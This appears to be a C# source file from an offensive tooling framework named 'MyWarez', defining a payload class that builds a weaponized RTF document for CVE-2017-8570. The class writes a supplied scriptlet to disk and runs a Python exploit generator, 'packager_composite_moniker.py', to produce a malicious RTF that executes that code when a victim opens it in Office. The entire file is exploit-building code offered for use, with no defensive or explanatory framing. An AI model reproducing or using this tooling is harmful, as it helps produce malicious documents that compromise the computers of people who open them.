using System.Diagnostics;
using System.IO;

using MyWarez.Core;

namespace MyWarez.Payloads
{
    public sealed class CVE_2017_8570 : Rtf
    {
        public CVE_2017_8570(IScriptComponent sct) : base(BuildRtf(sct)) { }

        private static byte[] BuildRtf(IScriptComponent sct)
        {
            using (new TemporaryContext())
            {
                Utils.CopyFilesRecursively(SourceDirectory, ".");
                System.IO.File.WriteAllBytes("input.sct", sct.Bytes);
                var proc2 = Process.Start(@"C:\Python27\python.exe", Exploit_generator_script + " -s input.sct -o CVE_2017_8570.rtf");
                proc2.WaitForExit();
                var outputFileName = OutputFileName + ".rtf";
                return System.IO.File.ReadAllBytes(outputFileName);
            }
        }

        private static readonly string SourceDirectory = Path.Join(Core.Constants.PayloadsResourceDirectory, "Windows", "Execution", "ClientExploitation", typeof(CVE_2017_8570).Name);
        private static readonly string OutputFileName = new DirectoryInfo(SourceDirectory).Name;
        private static readonly string Exploit_generator_script = "packager_composite_moniker.py";
    }
}
